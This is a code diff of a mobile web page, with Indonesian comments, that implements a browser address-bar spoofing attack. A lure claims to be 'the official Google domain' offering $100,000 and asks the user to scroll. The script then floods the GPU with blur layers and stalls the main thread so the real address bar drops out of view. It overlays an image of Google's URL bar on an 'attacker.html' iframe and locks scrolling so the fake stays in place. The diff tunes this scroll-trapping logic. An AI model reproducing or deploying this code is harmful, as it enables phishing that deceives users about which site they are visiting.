@@ -1,162 +1,114 @@
 <!doctype html>
-<html lang="en" id="main-html">
+<html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
-    />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     <title>azzzab</title>
     <style>
-      /* KUNCI UTAMA: Matikan pull-to-refresh dan elastic scroll */
       html, body {
-        margin: 0;
-        padding: 0;
-        width: 100%;
-        height: 200vh; /* Tinggi buat trigger */
-        background-color: #f8f9fa;
-        font-family: sans-serif;
-        overflow-x: hidden;
-        overscroll-behavior: none !important; /* MATIKAN ELASTIC SCROLL */
-        touch-action: pan-y; 
+        margin: 0; padding: 0; width: 100%; height: 100%;
+        background-color: #f8f9fa; overflow: hidden; /* Lock root */
       }
 
-      /* Class buat gembok total setelah spoofing aktif */
-      .locked {
-        height: 100vh !important;
-        overflow: hidden !important;
-        position: fixed !important;
-        touch-action: none !important;
+      /* Container Utama yang kita manipulasi */
+      #viewport {
+        width: 100%;
+        height: 100%;
+        overflow-y: scroll;
+        -webkit-overflow-scrolling: touch; /* Smooth scroll buat iOS */
+        overscroll-behavior: none;
+      }
+
+      /* Content harus sedikit lebih panjang dari layar agar scroll 'aktif' tapi gak mentok */
+      #content-wrapper {
+        height: 101vh; 
+        position: relative;
       }
 
       #scroll-bait {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        text-align: center;
-        color: #5f6368;
-        padding: 20px;
+        display: flex; flex-direction: column; align-items: center;
+        justify-content: center; height: 100vh; text-align: center;
       }
 
       #fake-ui {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100vw;
-        height: 100vh;
-        z-index: 99999;
-        background: #fff;
-        touch-action: none; /* Blokir gesture di container ini */
+        display: none; position: fixed; top: 0; left: 0;
+        width: 100vw; height: 100vh; z-index: 99999; background: #fff;
       }
 
       #fake-bar {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        height: 56px;
-        object-fit: contain;
-        border-bottom: 1px solid #ddd;
-        z-index: 100;
-        opacity: 0;
-        pointer-events: none;
-        touch-action: none;
-        -webkit-user-drag: none;
+        position: absolute; bottom: 0; left: 0; width: 100%;
+        height: 56px; object-fit: contain; z-index: 100;
+        opacity: 0; pointer-events: none; touch-action: none;
       }
 
       #fake-content {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100vh;
-        border: none;
-        z-index: 1;
+        position: absolute; top: 0; left: 0; width: 100%;
+        height: 100vh; border: none; z-index: 1;
       }
 
-      #gpu-killer {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 1px;
-        height: 1px;
-        pointer-events: none;
-        z-index: 1;
-      }
+      #gpu-killer { position: fixed; top: 0; left: 0; width: 1px; height: 1px; pointer-events: none; }
     </style>
   </head>
   <body>
-    <div id="scroll-bait">
-      <h2>
-        This is the official Google domain. Want to earn $100,000? <br>
-        Please scroll down to proceed.
-      </h2>
-      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
+
+    <div id="viewport">
+        <div id="content-wrapper">
+            <div id="scroll-bait">
+                <h2>Scroll down to verify domain...</h2>
+                <div style="font-size: 50px; color: #1a73e8;">↓</div>
+            </div>
+        </div>
     </div>
 
     <div id="gpu-killer"></div>
 
     <div id="fake-ui">
-      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
+      <img id="fake-bar" src="urlbar-google.jpg" />
       <iframe id="fake-content" src="attacker.html"></iframe>
     </div>
 
     <script>
       let isSpoofed = false;
-      const html = document.documentElement;
-      const body = document.body;
+      const vp = document.getElementById("viewport");
 
       function triggerMeltdown() {
         const killer = document.getElementById("gpu-killer");
-        for (let i = 0; i < 2500; i++) {
+        for (let i = 0; i < 2000; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:100vw; height:1vh; backdrop-filter:blur(15px);`;
+          div.style.cssText = `position:absolute; width:100vw; height:1vh; backdrop-filter:blur(10px);`;
           killer.appendChild(div);
         }
-        // Blocking main thread secara brutal
         let start = Date.now();
-        while (Date.now() - start < 500) {} 
+        while (Date.now() - start < 450) {} 
       }
 
-      // FUNGSI LOCKDOWN TOTAL
-      function activateGembok() {
-        isSpoofed = true;
-        
-        // 1. Ubah tinggi jadi 100vh biar gak bisa scroll lagi
-        html.classList.add('locked');
-        body.classList.add('locked');
-
-        // 2. Tampilkan Fake UI
-        document.getElementById("fake-ui").style.display = "block";
-        
-        // 3. Matikan semua event scroll/touch secara paksa
-        const prevent = (e) => {
-            if (isSpoofed) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }
-        };
-
-        ['touchstart', 'touchmove', 'wheel', 'mousewheel', 'keydown'].forEach(evt => {
-            window.addEventListener(evt, prevent, { passive: false });
-        });
-      }
-
-      window.addEventListener("scroll", () => {
-          if (window.scrollY > 60 && !isSpoofed) {
-            triggerMeltdown();
-            activateGembok();
-            window.scrollTo(0, 0);
-
-            setTimeout(() => {
-              document.getElementById("gpu-killer").innerHTML = "";
-            }, 800);
+      // RAHASIA UTAMA: Anti-Mentok Logic
+      vp.addEventListener("scroll", () => {
+          if (!isSpoofed && vp.scrollTop > 50) {
+              isSpoofed = true;
+              document.getElementById("fake-ui").style.display = "block";
+              triggerMeltdown();
+              // Reset ke posisi 'aman' (bukan 0)
+              vp.scrollTop = 5; 
           }
-      }, { passive: false });
+
+          if (isSpoofed) {
+              // Jika user coba scroll up sampai mentok (0), paksa balik ke 1px
+              if (vp.scrollTop <= 0) {
+                  vp.scrollTop = 1;
+              }
+              // Jika user coba scroll down sampai mentok, paksa naik 1px
+              if (vp.scrollTop + vp.offsetHeight >= vp.scrollHeight) {
+                  vp.scrollTop = vp.scrollHeight - vp.offsetHeight - 1;
+              }
+          }
+      });
+
+      // Blokir total interaksi pada Fake Bar Image
+      const fb = document.getElementById("fake-bar");
+      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
+          fb.addEventListener(evt, (e) => e.preventDefault(), { passive: false });
+      });
 
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
@@ -166,20 +118,8 @@
           fakeBar.style.pointerEvents = "auto";
           fakeContent.style.top = "56px";
           fakeContent.style.height = "calc(100vh - 56px)";
-          
-          // Pastikan Address Bar asli beneran ilang dengan cara maksa scroll tipis
-          window.scrollTo(0, 1);
         }
       });
-
-      // BLOKIR KHUSUS PADA IMAGE FAKE BAR
-      const fb = document.getElementById("fake-bar");
-      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
-          fb.addEventListener(evt, (e) => {
-              e.preventDefault();
-          }, { passive: false });
-      });
-
     </script>
   </body>
 </html>
